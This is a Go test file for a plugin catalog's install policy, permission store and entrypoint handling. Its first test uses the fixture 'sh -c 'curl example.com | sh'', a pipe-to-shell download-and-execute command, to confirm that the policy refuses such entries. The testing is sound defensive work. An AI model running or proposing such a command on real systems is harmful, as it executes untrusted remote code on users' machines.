package main

import (
	"os"
	"path/filepath"
	"testing"

	"gopkg.in/yaml.v3"
)

// TestSetupCmdIsRefusedByPolicy pins the reason setup_cmd is no longer run:
// the policy check has to see it, so that an entry carrying one cannot reach
// the installer unannounced.
func TestSetupCmdIsRefusedByPolicy(t *testing.T) {
	item := PlugRingItem{ID: "a", Entrypoint: "plugin.lua", SetupCmd: "sh -c 'curl example.com | sh'"}
	problem := PlugRingItemProblem(item)
	if problem == "" {
		t.Fatal("an entry running a command at install time was accepted")
	}
}

func TestRemovingAPluginDropsItsGrants(t *testing.T) {
	store := LoadPermissionStore(filepath.Join(t.TempDir(), "perms.json"))
	if err := store.Remember("notes", PermissionFFI, PermissionAllow); err != nil {
		t.Fatalf("Remember: %v", err)
	}
	if err := store.Forget("notes"); err != nil {
		t.Fatalf("Forget: %v", err)
	}
	if _, ok := store.Decision("notes", PermissionFFI); ok {
		t.Error("a removed plugin kept the permissions it had been granted")
	}
}

// TestShippedCatalogMeetsItsOwnPolicy holds f4 to the rule it enforces on
// everybody else. The entries shipped in the repository are the first thing a
// user sees when they open PlugRing, so they cannot be the example of what the
// policy forbids.
func TestShippedCatalogMeetsItsOwnPolicy(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("plugring", "index.yaml"))
	if err != nil {
		t.Skipf("no catalog shipped in the repository: %v", err)
	}

	var items []PlugRingItem
	if err := yaml.Unmarshal(data, &items); err != nil {
		t.Fatalf("the shipped catalog does not parse: %v", err)
	}
	if len(items) == 0 {
		t.Fatal("the shipped catalog is empty")
	}

	for _, item := range items {
		if problem := PlugRingItemProblem(item); problem != "" {
			t.Errorf("%q breaks the distribution policy: %s", item.ID, problem)
		}
		if ok, reason := PlugRingItemRunsHere(item); !ok {
			t.Errorf("%q cannot run on the build that ships it: %s", item.ID, reason)
		}
	}
}

// TestBareEntrypointNeedsNoInterpreter guards the installer against warning
// about a dependency nobody can install. A bare .lua or .wasm entrypoint is a
// file f4 runs itself, so looking it up on the PATH would tell the user that
// "hello_plugring.lua" is missing from their system.
func TestBareEntrypointNeedsNoInterpreter(t *testing.T) {
	for _, entrypoint := range []string{"hello_plugring.lua", "notes.wasm"} {
		if entrypointNeedsInterpreterOnPath(entrypoint) {
			t.Errorf("%q was taken for a command on the PATH", entrypoint)
		}
	}
	for _, entrypoint := range []string{"lua notes.lua", "python3 main.py"} {
		if !entrypointNeedsInterpreterOnPath(entrypoint) {
			t.Errorf("%q runs under an interpreter that was not checked for", entrypoint)
		}
	}
	for _, entrypoint := range []string{"./notes", "/opt/f4/notes"} {
		if entrypointNeedsInterpreterOnPath(entrypoint) {
			t.Errorf("%q is a path, not a name to resolve on the PATH", entrypoint)
		}
	}
}
